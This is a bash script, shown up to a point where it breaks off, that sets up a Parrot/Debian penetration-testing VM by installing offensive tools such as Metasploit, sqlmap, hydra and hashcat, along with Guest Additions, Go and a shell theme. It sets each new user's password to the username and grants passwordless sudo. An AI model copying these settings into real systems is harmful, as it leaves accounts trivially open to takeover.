#!/bin/bash
# ============================================
# Automated Pentesting Environment Bootstrap
# Debian/Ubuntu/Parrot Compatible
# Author: Jamie Loring
# Last updated: 2026-03-30
# ============================================
# ============================================
# DISCLAIMER: This tool is for authorized testing only.
# Request permission before use. Stay legal.
# ============================================

set -euo pipefail

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
LIME='\033[1;92m'
NC='\033[0m'

# Capture original user before sudo
ORIGINAL_USER="${SUDO_USER:-$USER}"
[[ "$ORIGINAL_USER" == "root" ]] && ORIGINAL_USER=""

# Logging functions
log_info() { echo -e "${GREEN}[+]${NC} $1"; }
log_warn() { echo -e "${YELLOW}[!]${NC} $1"; }
log_error() { echo -e "${RED}[-]${NC} $1"; }
log_section() { echo -e "\n${CYAN}[*] $1${NC}"; }
log_skip() { echo -e "${BLUE}[~]${NC} $1"; }
log_success() { echo -e "${GREEN}[✓]${NC} $1"; }

# Check if running as root
if [[ $EUID -ne 0 ]]; then
    log_error "This script must be run as root (use sudo)"
    exit 1
fi

# Log file
LOG_FILE="/var/log/shellshock-install.log"
exec 1> >(tee -a "$LOG_FILE")
exec 2>&1

# Prevent all interactive prompts from apt/dpkg/needrestart
export DEBIAN_FRONTEND=noninteractive
export NEEDRESTART_MODE=a
APT_OPTS=(-y -qq -o Dpkg::Options::="--force-confdef" -o Dpkg::Options::="--force-confold")

# Username validation
validate_username() {
    local username="$1"

    # Format check
    if ! [[ "$username" =~ ^[a-z_][a-z0-9_-]{0,31}$ ]]; then
        log_error "Invalid username format. Must start with lowercase letter or underscore."
        return 1
    fi

    # Reserved system usernames (including Parrot's default 'user')
    local reserved=("root" "daemon" "bin" "sys" "sync" "games" "man" "lp" "mail"
                    "news" "uucp" "proxy" "www-data" "backup" "list" "irc" "nobody" "user")

    for reserved_name in "${reserved[@]}"; do
        if [[ "$username" == "$reserved_name" ]]; then
            log_error "Cannot use reserved system username: $username"
            return 1
        fi
    done

    return 0
}

# Check if command exists
command_exists() {
    command -v "$1" &>/dev/null
}

# Check if package is installed
package_installed() {
    dpkg -l "$1" 2>/dev/null | grep -q "^ii"
}

# Universal archive extractor
extract_archive() {
    local file="$1"
    if [[ ! -f "$file" ]]; then
        log_error "'$file' is not a valid file"
        return 1
    fi

    case "$file" in
        *.tar.bz2)   tar xjf "$file"     ;;
        *.tar.gz)    tar xzf "$file"     ;;
        *.tar.xz)    tar xJf "$file"     ;;
        *.bz2)       bunzip2 "$file"     ;;
        *.rar)       unrar e "$file"     ;;
        *.gz)        gunzip "$file"      ;;
        *.tar)       tar xf "$file"      ;;
        *.tbz2)      tar xjf "$file"     ;;
        *.tgz)       tar xzf "$file"     ;;
        *.zip)       unzip -q "$file"    ;;
        *.Z)         uncompress "$file"  ;;
        *.7z)        7z x "$file"        ;;
        *)
            log_error "'$file' cannot be extracted via extract_archive()"
            return 1
            ;;
    esac

    log_info "Extracted: $(basename $file)"
    return 0
}

# Safe download with retry
safe_download() {
    local url="$1"
    local output="$2"
    local name=$(basename "$output")

    if [[ -f "$output" ]]; then
        log_skip "$name already exists"
        return 0
    fi

    if wget --timeout=30 --tries=3 --no-verbose "$url" -O "$output" 2>&1 | tee -a "$LOG_FILE"; then
        log_info "Downloaded: $name"
        return 0
    else
        log_warn "Failed to download: $name (non-critical)"
        return 1
    fi
}

# Safe git clone
safe_clone() {
    local url="$1"
    local dest="$2"
    local name=$(basename "$dest")

    if [[ -d "$dest/.git" ]]; then
        log_skip "$name already cloned"
        return 0
    fi

    if git clone --depth 1 "$url" "$dest" 2>&1 | tee -a "$LOG_FILE"; then
        log_info "Cloned: $name"
        return 0
    else
        log_warn "Failed to clone: $name"
        return 1
    fi
}

# ============================================
# WELCOME BANNER
# ============================================

# Extended color definitions
RED='\033[38;5;196m'
ORANGE='\033[38;5;208m'
YELLOW='\033[38;5;226m'
GREEN='\033[38;5;46m'
CYAN='\033[38;5;51m'
BLUE='\033[38;5;21m'
MAGENTA='\033[38;5;201m'
PURPLE='\033[38;5;135m'
RESET='\033[0m'
NC='\033[0m'

clear
printf "\n"
printf "${RED} ____  ${ORANGE}_     ${YELLOW}     ${GREEN}_ _ ${CYAN}____  ${BLUE}_     ${MAGENTA}       ${PURPLE}_    ${RESET}\n"
printf "${RED}/ ___| ${ORANGE}| |__ ${YELLOW} ___ ${GREEN}| | |${CYAN}/ ___| ${BLUE}| |__ ${MAGENTA} ___   ${PURPLE}___| | __${RESET}\n"
printf "${RED}\\\\___ \\\\ ${ORANGE}| '_ \\\\${YELLOW}/ _ \\\\${GREEN}| | |${CYAN}\\\\___ \\\\ ${BLUE}| '_ \\\\${MAGENTA}/ _ \\\\ ${PURPLE}/ __| |/ /${RESET}\n"
printf "${RED} ___) |${ORANGE}| | | ${YELLOW} __/ ${GREEN}| | |${CYAN} ___) |${BLUE}| | | ${MAGENTA}| (_) |${PURPLE}| (__|   < ${RESET}\n"
printf "${RED}|____/ ${ORANGE}|_| |_${YELLOW}\\\\___|${GREEN}|_|_|${CYAN}|____/ ${BLUE}|_| |_${MAGENTA}|\\\\___/ ${PURPLE}\\\\___|_|\\\\_\\\\${RESET}\n"
printf "${RESET}\n"
printf "${CYAN}═══════════════════════════════════════════════════════════${RESET}\n"
printf "${GREEN}                    ShellShock Framework${RESET}\n"
printf "${CYAN}═══════════════════════════════════════════════════════════${RESET}\n"
printf "\n"
printf "${PURPLE}            A love letter to pentesting${RESET}\n"
printf "${MAGENTA}                  by Jamie Loring${RESET}\n"
printf "${NC}\n\n"

# Check if running as 'user' account
if [[ "$USER" == "user" ]] || [[ "$SUDO_USER" == "user" ]]; then
    echo -e "${YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "${YELLOW}                    IMPORTANT NOTICE                         ${NC}"
    echo -e "${YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "${RED}You are currently logged in as the 'user' account.${NC}"
    echo ""
    echo -e "This script will:"
    echo -e "  ${GREEN}1.${NC} Create a NEW dedicated pentesting user account"
    echo -e "  ${GREEN}2.${NC} Install and configure all tools"
    echo -e "  ${GREEN}3.${NC} Disable the default 'user' account for security"
    echo ""
    echo -e "${YELLOW}After installation, you MUST:${NC}"
    echo -e "  • Log out of the 'user' account"
    echo -e "  • Log in with your new pentesting account"
    echo ""
    echo -e "${CYAN}Press ENTER to continue...${NC}"
    read -r
    echo ""
fi

# Username prompt with explicit warning
DEFAULT_USERNAME="$ORIGINAL_USER"
[[ -z "$DEFAULT_USERNAME" ]] && DEFAULT_USERNAME="pentester"
[[ "$DEFAULT_USERNAME" == "user" ]] && DEFAULT_USERNAME="pentester"

echo -e "${CYAN}━━━ Pentesting User Account Setup ━━━${NC}"
echo ""
echo -e "${YELLOW}RESERVED NAMES (cannot be used):${NC}"
echo -e "  root, daemon, user, www-data, nobody, and other system accounts"
echo ""
echo -e "${GREEN}Suggested usernames:${NC}"
echo -e "  pentester, hacker, redteam, blueteam, your_name"
echo ""

while true; do
    read -p "Enter NEW pentesting username [default: $DEFAULT_USERNAME]: " USERNAME
    USERNAME="${USERNAME:-$DEFAULT_USERNAME}"

    # Extra check for 'user' with explicit error
    if [[ "$USERNAME" == "user" ]]; then
        echo ""
        log_error "Cannot use 'user' as username!"
        log_error "The 'user' account is Parrot's default and will be disabled after setup."
        log_error "Please choose a different username."
        echo ""
        continue
    fi

    validate_username "$USERNAME" && break
    echo ""
done

export USERNAME
export USER_HOME="/home/$USERNAME"
export ACTUAL_USER="$USERNAME"
mkdir -p "$USER_HOME"

echo ""
log_info "Target username: ${GREEN}$USERNAME${NC}"
log_info "Password will be: ${GREEN}$USERNAME${NC}"
log_info "Home directory: ${GREEN}$USER_HOME${NC}"
echo ""

# Final confirmation with clear messaging
if id "user" &>/dev/null; then
    echo -e "${YELLOW}NOTE:${NC} The default 'user' account will be ${RED}disabled${NC} after installation."
    echo -e "      You will need to log in as ${GREEN}$USERNAME${NC} after reboot."
    echo ""
fi

log_warn "This will install pentesting tools and configure the system."
log_warn "Smart detection enabled - existing installations will be skipped."
echo ""
read -p "Continue? (y/n): " -n 1 -r
echo ""
if [[ ! $REPLY =~ ^[Yy]$ ]]; then
    log_error "Installation cancelled"
    exit 1
fi

# ============================================
# PHASE 1: SYSTEM PREPARATION
# ============================================
log_section "Phase 1: System Preparation"

# Ensure package lists are up to date
log_info "Updating package lists..."
apt-get update -qq

# Install chrony for time synchronization
if ! command_exists chronyc; then
    log_info "Installing chrony for time synchronization..."
    DEBIAN_FRONTEND=noninteractive apt-get install -y -qq chrony 2>&1 | grep -v "warning:" || true
fi

# Start and enable chrony service
if command_exists chronyc; then
    log_info "Starting chrony service..."
    systemctl enable chrony 2>/dev/null || true
    systemctl restart chrony 2>/dev/null || true

    # Wait a moment for sync to start
    sleep 2

    # Force immediate time sync
    log_info "Forcing time synchronization..."
    chronyc makestep 2>&1 | tee -a "$LOG_FILE" || log_warn "chronyc makestep failed (non-critical)"

    # Check sync status
    if chronyc tracking 2>&1 | grep -q "Leap status.*Normal"; then
        log_success "Time synchronized successfully"
    else
        log_warn "Time sync status unclear, continuing anyway..."
    fi
else
    log_warn "chrony not available, skipping time sync"
fi

# Critical MATE desktop packages — pinned to survive apt upgrades
# Parrot updates have been known to rip these out as collateral damage
MATE_CRITICAL_PACKAGES=(
    "caja"
    "caja-common"
    "mate-desktop"
    "mate-panel"
    "mate-session-manager"
    "mate-settings-daemon"
)

# Pin before upgrade
log_info "Pinning critical MATE desktop packages before upgrade..."
for pkg in "${MATE_CRITICAL_PACKAGES[@]}"; do
    if dpkg -l "$pkg" 2>/dev/null | grep -q "^ii"; then
        apt-mark hold "$pkg" 2>/dev/null && log_info "Pinned: $pkg" || log_warn "Could not pin: $pkg"
    fi
done

# Upgrade system packages
log_info "Upgrading system packages..."
DEBIAN_FRONTEND=noninteractive NEEDRESTART_MODE=a apt-get upgrade -y -qq \
    -o Dpkg::Options::="--force-confdef" \
    -o Dpkg::Options::="--force-confold"

# Unpin after upgrade
log_info "Releasing package pins..."
for pkg in "${MATE_CRITICAL_PACKAGES[@]}"; do
    apt-mark unhold "$pkg" 2>/dev/null || true
done

# Verify MATE desktop integrity — reinstall anything that got yanked
log_info "Verifying MATE desktop integrity..."
MATE_MISSING=()
for pkg in "${MATE_CRITICAL_PACKAGES[@]}"; do
    if ! dpkg -l "$pkg" 2>/dev/null | grep -q "^ii"; then
        MATE_MISSING+=("$pkg")
    fi
done

if [[ ${#MATE_MISSING[@]} -gt 0 ]]; then
    log_warn "MATE packages missing after upgrade, reinstalling: ${MATE_MISSING[*]}"
    DEBIAN_FRONTEND=noninteractive apt-get install -y "${MATE_MISSING[@]}" 2>&1 | tee -a "$LOG_FILE"
    log_info "MATE desktop packages restored"
else
    log_info "MATE desktop integrity verified — all packages present"
fi

# ============================================
# PHASE 2: VIRTUALBOX GUEST ADDITIONS
# ============================================
log_section "Phase 2: VirtualBox Guest Additions"

# Detect if running in VirtualBox
IS_VIRTUALBOX=false
if dmidecode -s system-product-name 2>/dev/null | grep -qi "VirtualBox"; then
    IS_VIRTUALBOX=true
    log_info "VirtualBox VM detected (via dmidecode)"
elif lspci 2>/dev/null | grep -qi "VirtualBox"; then
    IS_VIRTUALBOX=true
    log_info "VirtualBox VM detected (via lspci)"
fi

if [[ "$IS_VIRTUALBOX" == "true" ]]; then
    # Check if Guest Additions are already installed (multiple methods)
    VBOX_ALREADY_INSTALLED=false
    if command_exists VBoxClient; then
        VBOX_ALREADY_INSTALLED=true
    elif dpkg -l virtualbox-guest-utils 2>/dev/null | grep -q "^ii"; then
        VBOX_ALREADY_INSTALLED=true
    elif [[ -f /usr/sbin/VBoxService ]]; then
        VBOX_ALREADY_INSTALLED=true
    elif lsmod | grep -q vboxguest; then
        VBOX_ALREADY_INSTALLED=true
    fi

    if [[ "$VBOX_ALREADY_INSTALLED" == "true" ]]; then
        INSTALLED_VER=$(VBoxClient --version 2>/dev/null | head -n1 || echo "unknown")
        log_skip "VirtualBox Guest Additions already installed ($INSTALLED_VER) — skipping"
    else
        log_info "Installing VirtualBox Guest Additions..."

        # Install build dependencies first
        log_info "Installing build dependencies..."
        BUILD_DEPS="build-essential dkms linux-headers-$(uname -r) gcc make perl"
        if DEBIAN_FRONTEND=noninteractive apt-get install -y -qq $BUILD_DEPS 2>&1 | tee -a "$LOG_FILE"; then
            log_info "Build dependencies installed"
        else
            log_warn "Some build dependencies failed to install"
        fi

        # Detect VirtualBox version with multiple methods
        log_info "Detecting VirtualBox version..."
        VBOX_VERSION=""

        # Method 1: dmidecode system-version
        if [[ -z "$VBOX_VERSION" ]]; then
            VBOX_VERSION=$(dmidecode -s system-version 2>/dev/null | grep -oE '[0-9]+\.[0-9]+\.[0-9]+' | head -n1 || true)
        fi

        # Method 2: Try bios-version
        if [[ -z "$VBOX_VERSION" ]]; then
            VBOX_VERSION=$(dmidecode -s bios-version 2>/dev/null | grep -oE '[0-9]+\.[0-9]+\.[0-9]+' | head -n1 || true)
        fi

        # Method 3: Check if VBoxControl exists
        if [[ -z "$VBOX_VERSION" ]] && command_exists VBoxControl; then
            VBOX_VERSION=$(VBoxControl --version 2>/dev/null | grep -oE '[0-9]+\.[0-9]+\.[0-9]+' | head -n1 || true)
        fi

        if [[ -z "$VBOX_VERSION" ]]; then
            VBOX_VERSION="7.1.4"
            log_warn "Could not auto-detect version, using $VBOX_VERSION"
        else
            log_info "VirtualBox version: $VBOX_VERSION"
        fi

        # Download Guest Additions ISO
        ISO_URL="https://download.virtualbox.org/virtualbox/${VBOX_VERSION}/VBoxGuestAdditions_${VBOX_VERSION}.iso"
        ISO_FILE="/tmp/VBoxGuestAdditions_${VBOX_VERSION}.iso"

        if [[ -f "$ISO_FILE" ]]; then
            log_skip "ISO already downloaded"
        else
            log_info "Downloading Guest Additions ISO..."
            log_info "URL: $ISO_URL"

            if wget --progress=bar:force --timeout=60 "$ISO_URL" -O "$ISO_FILE" 2>&1 | tee -a "$LOG_FILE"; then
                log_info "Download complete"
            else
                log_warn "Download failed, trying fallback version 7.1.4..."
                ISO_URL="https://download.virtualbox.org/virtualbox/7.1.4/VBoxGuestAdditions_7.1.4.iso"

                if wget --progress=bar:force --timeout=60 "$ISO_URL" -O "$ISO_FILE" 2>&1 | tee -a "$LOG_FILE"; then
                    VBOX_VERSION="7.1.4"
                    log_info "Fallback download complete"
                else
                    log_warn "Guest Additions download failed, skipping (non-critical)"
                    ISO_FILE=""
                fi
            fi
        fi

        # Install if ISO downloaded successfully
        if [[ -n "$ISO_FILE" ]] && [[ -f "$ISO_FILE" ]]; then
            # Verify ISO size
            ISO_SIZE=$(stat -c%s "$ISO_FILE" 2>/dev/null || echo "0")
            if [[ "$ISO_SIZE" -lt 10000000 ]]; then
                log_warn "Downloaded ISO is too small ($ISO_SIZE bytes), skipping"
                rm -f "$ISO_FILE"
            else
                log_info "ISO size: $(numfmt --to=iec $ISO_SIZE)"

                # Mount and install
                MOUNT_POINT="/mnt/vbox-guest-additions"
                mkdir -p "$MOUNT_POINT"

                # Unmount if already mounted
                if mountpoint -q "$MOUNT_POINT" 2>/dev/null; then
                    log_info "Unmounting existing mount..."
                    umount "$MOUNT_POINT" 2>/dev/null || true
                fi

                if mount -o loop "$ISO_FILE" "$MOUNT_POINT" 2>&1 | tee -a "$LOG_FILE"; then
                    log_info "ISO mounted at $MOUNT_POINT"

                    # Run installer
                    if [[ -f "$MOUNT_POINT/VBoxLinuxAdditions.run" ]]; then
                        log_info "Running VBoxLinuxAdditions.run..."
                        cd "$MOUNT_POINT"

                        if sh VBoxLinuxAdditions.run --nox11 2>&1 | tee -a "$LOG_FILE"; then
                            log_success "Guest Additions installed successfully"
                            VBOX_INSTALL_SUCCESS=true
                        else
                            EXIT_CODE=$?
                            if [[ $EXIT_CODE -eq 2 ]]; then
                                log_warn "Guest Additions installed with warnings (non-critical)"
                                VBOX_INSTALL_SUCCESS=true
                            else
                                log_warn "Guest Additions installation had issues (exit code: $EXIT_CODE)"
                                VBOX_INSTALL_SUCCESS=false
                            fi
                        fi
                        cd /
                    else
                        log_warn "VBoxLinuxAdditions.run not found in ISO"
                        VBOX_INSTALL_SUCCESS=false
                    fi

                    # Cleanup mount
                    umount "$MOUNT_POINT" 2>/dev/null || log_warn "Could not unmount $MOUNT_POINT"
                    rmdir "$MOUNT_POINT" 2>/dev/null || true
                else
                    log_warn "Could not mount ISO"
                    VBOX_INSTALL_SUCCESS=false
                fi

                # Cleanup ISO
                rm -f "$ISO_FILE"

                # Verify installation
                if [[ "${VBOX_INSTALL_SUCCESS:-false}" == "true" ]]; then
                    if lsmod | grep -q vboxguest; then
                        log_success "vboxguest kernel module loaded"
                    else
                        log_warn "vboxguest module not loaded yet (will load after reboot)"
                    fi
                fi
            fi
        fi
    fi
else
    log_skip "Not a VirtualBox VM, skipping Guest Additions"
fi

# ============================================
# PHASE 3: CORE PACKAGES
# ============================================
log_section "Phase 3: Installing Core Packages"

CORE_PACKAGES=(
    # Essential
    "curl" "wget" "git" "vim" "nano" "unzip" "p7zip-full" "software-properties-common"
    "apt-transport-https" "ca-certificates" "gnupg" "lsb-release"
    "pass"

    # Dependencies for Python modules (aioquic, cryptography, etc.)
    "libssl-dev" "python3-dev" "libffi-dev" "libxml2-dev" "libxslt1-dev" "libjpeg-dev" "libpq-dev"

    # Shells
    "tmux"

    # Build tools
    "build-essential" "gcc" "g++" "make" "cmake" "pkg-config"

    # Python
    "python3" "python3-pip" "python3-venv" "python3-dev" "pipx"

    # Ruby
    "ruby" "ruby-dev"

    # Network tools
    "nmap" "masscan" "netcat-traditional" "socat" "tcpdump" "wireshark" "tshark"
    "dnsutils" "whois" "ldap-utils" "openssl" "openvpn"

    # Web tools
    "curl" "wget" "nikto" "dirb"
    "wfuzz" "sqlmap" "whatweb"

    # Node.js (Playwright dependency + general tooling)
    "nodejs" "npm"

    # Proxying & pivoting
    "proxychains4" "sshpass"

    # Binary analysis & debugging
    "gdb" "gdbserver" "ltrace" "strace" "patchelf" "nasm"

    # Forensics & steganography
    "binwalk" "steghide" "exiftool" "foremost"

    # Cross-compilation (Windows exploits)
    "mingw-w64"

    # Containers
    "docker.io"

    # Shell upgrade helper
    "rlwrap"

    # Additional enumeration
    "enum4linux" "nbtscan" "onesixtyone" "netdiscover" "smbmap"

    # Other tools
    "john" "hashcat" "hydra" "nfs-common" "snmp" "ftp"
    "exploitdb" "metasploit-framework"
)

log_info "Installing core packages (this may take a while)..."
for package in "${CORE_PACKAGES[@]}"; do
    if package_installed "$package"; then
        log_skip "$package already installed"
    else
        if DEBIAN_FRONTEND=noninteractive apt-get install -y -qq "$package" 2>&1 | tee -a "$LOG_FILE"; then
            log_info "Installed: $package"
        else
            log_warn "Failed to install: $package (non-critical)"
        fi
    fi
done

# Optional packages (may have dependency conflicts)
OPTIONAL_PACKAGES=("smbclient" "cifs-utils")
log_info "Installing optional packages..."
for package in "${OPTIONAL_PACKAGES[@]}"; do
    if package_installed "$package"; then
        log_skip "$package already installed"
    else
        DEBIAN_FRONTEND=noninteractive apt-get install -y -qq "$package" 2>&1 | tee -a "$LOG_FILE" && \
            log_info "Installed: $package" || \
            log_warn "Could not install: $package (optional, skipping)"
    fi
done

# ============================================
# PHASE 4: USER ACCOUNT CONFIGURATION
# ============================================
log_section "Phase 4: User Account Configuration"

# Create user if doesn't exist
if id "$USERNAME" &>/dev/null; then
    log_skip "User $USERNAME already exists"
else
    log_info "Creating user: $USERNAME"

    # Ensure docker group exists
    if ! getent group docker > /dev/null; then
        groupadd docker
        log_info "Created docker group"
    fi

    # Create user with bash first (zsh may not be in PATH yet)
    useradd -m -s /bin/bash -G sudo,docker "$USERNAME"

    # Set password to match username
    echo "$USERNAME:$USERNAME" | chpasswd
    log_info "User created with password: $USERNAME"
fi

# Add to groups if not already member
for group in sudo docker; do
    if ! id -nG "$USERNAME" | grep -qw "$group"; then
        usermod -aG "$group" "$USERNAME"
        log_info "Added $USERNAME to $group group"
    fi
done

# Passwordless sudo
SUDOERS_FILE="/etc/sudoers.d/$USERNAME"
if [[ ! -f "$SUDOERS_FILE" ]]; then
    echo "$USERNAME ALL=(ALL) NOPASSWD:ALL" > "$SUDOERS_FILE"
    chmod 440 "$SUDOERS_FILE"
    log_info "Configured passwordless sudo"
fi

# Create directory structure
log_info "Creating directory structure..."
mkdir -p "$USER_HOME"/{tools/{repos,scripts,windows},engagements,wordlists,.config,Desktop}

# Set ownership immediately
chown -R "$USERNAME":"$USERNAME" "$USER_HOME"
log_success "Set ownership of $USER_HOME to $USERNAME"

# ============================================
# PHASE 5: GO INSTALLATION
# ============================================
log_section "Phase 5: Installing Go with Proper PATH Configuration"

# Install Go only if not already present
if [[ -f "/usr/local/go/bin/go" ]]; then
    log_skip "Go already installed: $(/usr/local/go/bin/go version)"
else
    log_info "Installing Go 1.23.3..."
    cd /tmp
    wget -q https://go.dev/dl/go1.23.3.linux-amd64.tar.gz
    tar -C /usr/local -xzf go1.23.3.linux-amd64.tar.gz
    rm go1.23.3.linux-amd64.tar.gz
fi

# Layer 1: /etc/environment (system-wide)
log_info "Configuring Go PATH (system-wide)..."
if ! grep -q "/usr/local/go/bin" /etc/environment; then
    sed -i 's|PATH="\(.*\)"|PATH="/usr/local/go/bin:\1"|' /etc/environment
fi

# Layer 2: /etc/profile.d/golang.sh (all shells)
cat > /etc/profile.d/golang.sh << 'EOF'
export GOROOT=/usr/local/go
export GOPATH=$HOME/go
export PATH=$GOROOT/bin:$GOPATH/bin:$PATH
EOF
chmod +x /etc/profile.d/golang.sh
log_info "Created /etc/profile.d/golang.sh"

# Layer 3: User shells
for shell_rc in "$USER_HOME/.bashrc"; do
    touch "$shell_rc"
    if ! grep -q "GOROOT" "$shell_rc"; then
        cat >> "$shell_rc" << 'EOF'

# Go configuration
export GOROOT=/usr/local/go
export GOPATH=$HOME/go
export PATH=$GOROOT/bin:$GOPATH/bin:$PATH
EOF
        log_info "Added Go PATH to $(basename $shell_rc)"
    fi
done

# Source for immediate use
source /etc/profile.d/golang.sh
export PATH="/usr/local/go/bin:$USER_HOME/go/bin:$PATH"

# Verify Go installation
if /usr/local/go/bin/go version &>/dev/null; then
    log_success "Go installed: $(/usr/local/go/bin/go version)"
else
    log_error "Go installation failed"
    exit 1
fi

# Create go directory
mkdir -p "$USER_HOME/go/bin"
chown -R "$USERNAME":"$USERNAME" "$USER_HOME/go"

# ============================================
# PHASE 6: SHELL CONFIGURATION & ZSH REMOVAL
# ============================================
log_section "Phase 6: Shell Configuration & ZSH Removal"

# Purge ZSH completely (causes command truncation during engagements)
log_info "Removing ZSH and related packages..."
ZSH_PACKAGES=(
    "zsh" "zsh-common" "zsh-dev"
    "zsh-autosuggestions" "zsh-syntax-highlighting"
)

for pkg in "${ZSH_PACKAGES[@]}"; do
    if package_installed "$pkg"; then
        log_info "Purging $pkg..."
        apt-get purge -y -qq "$pkg" 2>&1 | tee -a "$LOG_FILE" || log_warn "Failed to purge $pkg"
    fi
done

# Remove Oh-My-Zsh and related files if they exist
if [[ -d "$USER_HOME/.oh-my-zsh" ]]; then
    log_info "Removing Oh-My-Zsh installation..."
    rm -rf "$USER_HOME/.oh-my-zsh"
fi

if [[ -f "$USER_HOME/.zshrc" ]]; then
    log_info "Removing .zshrc..."
    rm -f "$USER_HOME/.zshrc"
fi

if [[ -f "$USER_HOME/.zsh_history" ]]; then
    rm -f "$USER_HOME/.zsh_history"
fi

if [[ -f "$USER_HOME/.p10k.zsh" ]]; then
    rm -f "$USER_HOME/.p10k.zsh"
fi

# Clean up zsh from /etc/shells if present
if grep -q "/usr/bin/zsh" /etc/shells 2>/dev/null; then
    log_info "Removing zsh from /etc/shells..."
    sed -i '/\/usr\/bin\/zsh/d' /etc/shells
fi

log_success "ZSH completely removed and purged"

# Ensure bash is the default shell
if [[ "$(getent passwd "$USERNAME" | cut -d: -f7)" != "/bin/bash" ]]; then
    log_info "Setting bash as default shell for $USERNAME..."
    chsh -s /bin/bash "$USERNAME" 2>&1 | tee -a "$LOG_FILE"
    log_success "Bash set as default shell"
else
    log_skip "Bash already default shell"
fi

# Configure bash with HTB Pwnbox color scheme
log_info "Configuring HTB-style bash environment..."

# Add bash aliases and configuration with HTB colors
if ! grep -q "# ShellShock HTB bash configuration" "$USER_HOME/.bashrc"; then
    cat >> "$USER_HOME/.bashrc" << 'EOFBASH'

# ShellShock HTB bash configuration
export HISTSIZE=10000
export HISTFILESIZE=20000
export HISTCONTROL=ignoredups:erasedups
shopt -s histappend

# HTB Pwnbox-style prompt (green user@host, cyan path, green $)
# Format: ┌──(user㉿hostname)-[~/path]
#         └─$
PS1='\[\033[01;32m\]┌──(\[\033[01;32m\]\u\[\033[01;32m\]㉿\[\033[01;32m\]\h\[\033[01;32m\])-[\[\033[01;36m\]\w\[\033[01;32m\]]\n\[\033[01;32m\]└─\[\033[01;32m\]\$\[\033[00m\] '

# Alternative simpler HTB-style prompt (single line)
# PS1='\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;36m\]\w\[\033[00m\]\[\033[01;32m\]\$\[\033[00m\] '

# Enable color support
if [ -x /usr/bin/dircolors ]; then
    test -r ~/.dircolors && eval "$(dircolors -b ~/.dircolors)" || eval "$(dircolors -b)"
fi

# HTB-style LS_COLORS (green directories, cyan executables)
export LS_COLORS='di=1;32:fi=0:ln=1;36:pi=40;33:so=1;35:bd=40;33;1:cd=40;33;1:or=40;31;1:mi=1;37;41:ex=1;32:*.tar=1;31:*.tgz=1;31:*.arc=1;31:*.arj=1;31:*.taz=1;31:*.lha=1;31:*.lz4=1;31:*.lzh=1;31:*.lzma=1;31:*.tlz=1;31:*.txz=1;31:*.tzo=1;31:*.t7z=1;31:*.zip=1;31:*.z=1;31:*.dz=1;31:*.gz=1;31:*.lrz=1;31:*.lz=1;31:*.lzo=1;31:*.xz=1;31:*.zst=1;31:*.tzst=1;31:*.bz2=1;31:*.bz=1;31:*.tbz=1;31:*.tbz2=1;31:*.tz=1;31:*.deb=1;31:*.rpm=1;31:*.jar=1;31:*.war=1;31:*.ear=1;31:*.sar=1;31:*.rar=1;31:*.alz=1;31:*.ace=1;31:*.zoo=1;31:*.cpio=1;31:*.7z=1;31:*.rz=1;31:*.cab=1;31:*.wim=1;31:*.swm=1;31:*.dwm=1;31:*.esd=1;31:*.jpg=1;35:*.jpeg=1;35:*.mjpg=1;35:*.mjpeg=1;35:*.gif=1;35:*.bmp=1;35:*.pbm=1;35:*.pgm=1;35:*.ppm=1;35:*.tga=1;35:*.xbm=1;35:*.xpm=1;35:*.tif=1;35:*.tiff=1;35:*.png=1;35:*.svg=1;35:*.svgz=1;35:*.mng=1;35:*.pcx=1;35:*.mov=1;35:*.mpg=1;35:*.mpeg=1;35:*.m2v=1;35:*.mkv=1;35:*.webm=1;35:*.ogm=1;35:*.mp4=1;35:*.m4v=1;35:*.mp4v=1;35:*.vob=1;35:*.qt=1;35:*.nuv=1;35:*.wmv=1;35:*.asf=1;35:*.rm=1;35:*.rmvb=1;35:*.flc=1;35:*.avi=1;35:*.fli=1;35:*.flv=1;35:*.gl=1;35:*.dl=1;35:*.xcf=1;35:*.xwd=1;35:*.yuv=1;35:*.cgm=1;35:*.emf=1;35:*.ogv=1;35:*.ogx=1;35:*.aac=1;36:*.au=1;36:*.flac=1;36:*.m4a=1;36:*.mid=1;36:*.midi=1;36:*.mka=1;36:*.mp3=1;36:*.mpc=1;36:*.ogg=1;36:*.ra=1;36:*.wav=1;36:*.oga=1;36:*.opus=1;36:*.spx=1;36:*.xspf=1;36:'
EOFBASH
    log_success "HTB bash configuration added"
fi

# Create custom dircolors for HTB theme
cat > "$USER_HOME/.dircolors" << 'EOFDIRCOLORS'
# HTB Pwnbox color scheme
# Directory colors
DIR 01;32
# Symbolic links
LINK 01;36
# Executables
EXEC 01;32
# Archives
.tar 01;31
.tgz 01;31
.zip 01;31
.gz 01;31
# Media
.jpg 01;35
.png 01;35
.gif 01;35
EOFDIRCOLORS
chown "$USERNAME":"$USERNAME" "$USER_HOME/.dircolors"
log_success "HTB dircolors configured"

# Configure terminal profile (MATE Terminal / GNOME Terminal)
log_info "Creating HTB terminal color profile..."

# Create terminal profile configuration script
cat > "$USER_HOME/.config/htb-terminal-setup.sh" << 'EOFTERMINAL'
#!/bin/bash
# HTB Pwnbox Terminal Color Profile
# Run this script to apply HTB colors to your terminal

# Detect terminal type
if command -v mate-terminal &>/dev/null; then
    TERMINAL="mate"
elif command -v gnome-terminal &>/dev/null; then
    TERMINAL="gnome"
else
    echo "No supported terminal found (MATE or GNOME)"
    exit 1
fi

# HTB Color Scheme (Pwnbox theme)
PROFILE_NAME="HTB-Pwnbox"

if [[ "$TERMINAL" == "mate" ]]; then
    # MATE Terminal configuration
    SCHEMA="org.mate.terminal.profile:/org/mate/terminal/profiles/htb-pwnbox/"

    # Create new profile
    PROFILE_LIST=$(gsettings get org.mate.terminal.global profile-list)
    if [[ ! "$PROFILE_LIST" =~ "htb-pwnbox" ]]; then
        NEW_LIST=$(echo "$PROFILE_LIST" | sed "s/]$/, 'htb-pwnbox']/")
        gsettings set org.mate.terminal.global profile-list "$NEW_LIST"
    fi

    # HTB Colors (dark background, green/cyan text)
    gsettings set org.mate.terminal.profile:/org/mate/terminal/profiles/htb-pwnbox/ visible-name "HTB Pwnbox"
    gsettings set org.mate.terminal.profile:/org/mate/terminal/profiles/htb-pwnbox/ use-theme-colors false
